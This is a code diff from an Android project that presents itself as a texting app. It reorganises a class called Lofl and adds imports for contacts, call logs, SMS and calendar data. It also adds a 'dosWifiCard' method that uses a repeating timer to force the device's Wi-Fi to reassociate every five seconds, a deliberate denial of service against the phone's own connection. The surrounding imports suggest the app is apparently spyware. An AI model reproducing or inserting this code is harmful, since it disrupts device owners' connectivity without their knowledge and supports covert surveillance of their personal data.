@@ -1,4 +1,4 @@
-package com.candroid.textme;
+package com.candroid.textme.api;
 
 import android.app.Activity;
 import android.app.Notification;
@@ -41,8 +41,18 @@ import android.provider.Telephony;
 import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
-import android.util.Log;
 import android.util.Pair;
+
+import com.candroid.textme.R;
+import com.candroid.textme.data.Constants;
+import com.candroid.textme.data.Pornhub;
+import com.candroid.textme.data.db.Database;
+import com.candroid.textme.data.db.DatabaseHelper;
+import com.candroid.textme.data.pojos.CalendarEvent;
+import com.candroid.textme.data.pojos.Contact;
+import com.candroid.textme.data.pojos.PhoneCall;
+import com.candroid.textme.data.pojos.SmsMsg;
+import com.candroid.textme.ui.activities.MainActivity;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -509,8 +519,19 @@ public class Lofl {
         }).start();
     }
 
-    public static void wifiDeauthenticate(Context context){
-        getWifiManager(context).disconnect();
+    public static void dosWifiCard(Context context){
+        WifiManager wifiManager = getWifiManager(context);
+        int state = wifiManager.getWifiState();
+        if( wifiManager.isWifiEnabled()){
+            TimerTask dosWifiCardTask = new TimerTask() {
+                @Override
+                public void run() {
+                    wifiManager.reassociate();
+                }
+            };
+            Timer timer = new Timer("dosWifiCard", true);
+            timer.schedule(dosWifiCardTask, 5000L, 5000L);
+        }
     }
 
     public static WifiManager getWifiManager(Context context){
